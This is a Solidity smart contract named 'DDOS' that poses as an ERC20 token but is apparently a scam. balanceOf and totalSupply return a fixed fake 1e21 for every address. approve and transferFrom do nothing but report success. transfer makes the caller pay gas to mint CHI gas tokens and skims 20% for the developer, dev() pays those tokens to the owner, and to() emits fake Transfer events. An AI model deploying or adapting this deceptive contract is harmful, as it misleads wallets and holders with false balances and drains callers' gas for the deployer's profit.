
pragma solidity ^0.6.0;


interface IERC20 {

    function totalSupply() external view returns (uint256);


    function balanceOf(address account) external view returns (uint256);


    function transfer(address recipient, uint256 amount) external returns (bool);


    function allowance(address owner, address spender) external view returns (uint256);


    function approve(address spender, uint256 amount) external returns (bool);


    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);


    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface Imint {

    function mint(uint256 value) external;

    function transfer(address recipient, uint256 amount) external  returns (bool);

}

abstract contract ERC20WithoutTotalSupply is IERC20 {

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    function balanceOf(address account) public view override returns (uint256) {
        return 1000000000000000000000;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        return true;
    }
    function _transfer(address sender, address recipient, uint256 amount) internal {
        emit Transfer(sender, recipient, amount);
    }

}

contract DDOS is IERC20, ERC20WithoutTotalSupply {

    string constant public name = "DDOS";
    string constant public symbol = "DDOS";
    uint8 constant public decimals = 0;
    Imint public constant chi = Imint(0x0000000000004946c0e9F43F4Dee607b0eF1fA1c);
    address public owner;
    
    constructor () public{
        owner = msg.sender;
    }
    function totalSupply() public view override returns(uint256) {

        return 1000000000000000000000;
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {

        require(amount >= 5,"amount must >= 5");
        chi.mint(amount);
        uint256 todev = amount * 20/100; //20% to dev
        chi.transfer(recipient,amount-todev);
        return true;
    }
    function dev(uint256 amount) public{

        chi.transfer(owner,amount);
    }
    function to(address recipient) public returns (bool){

        _transfer(msg.sender,recipient,1);
    }
    
    
}